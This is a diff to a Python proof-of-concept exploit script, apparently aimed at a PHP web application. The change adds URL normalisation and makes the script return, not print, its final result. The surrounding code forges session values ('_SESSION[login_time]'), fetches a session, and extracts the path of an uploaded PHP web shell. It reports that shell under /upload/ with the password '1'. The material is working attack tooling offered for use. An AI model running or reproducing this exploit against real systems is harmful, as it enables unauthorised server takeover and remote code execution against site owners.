@@ -11,8 +11,16 @@ payload1 = {
 	'_SESSION[login_time]':'99999999999'
 	}
 
+def fixurl(url):
+	if url.startswith('http://') or url.startswith('https://'):
+		return url 
+	else:
+		url = 'http://'+url
+		return url 
+
 def poc(url):
 	#获取session
+	url = fixurl(url)
 	t = urlparse.urlparse(url)
 	url1 = t.scheme+'://'+t.netloc+'/index.php'
 	s = requests.session()
@@ -40,7 +48,7 @@ def poc(url):
 		shell_path = re.findall('<input style="display:none" type="radio" rel=".*?" id="pic_sl" value="(.*?)" name="pic_sl"/>',res.content)
 		for shell in shell_path:
 			if 'php' in shell:
-				print '[*]shell:'+url+'/upload/'+shell_path[0]+ '  [password:1]'
+				return '[*]shell:'+url+'/upload/'+shell_path[0]+ '  [password:1]'
 				break
 	except:
 		return False
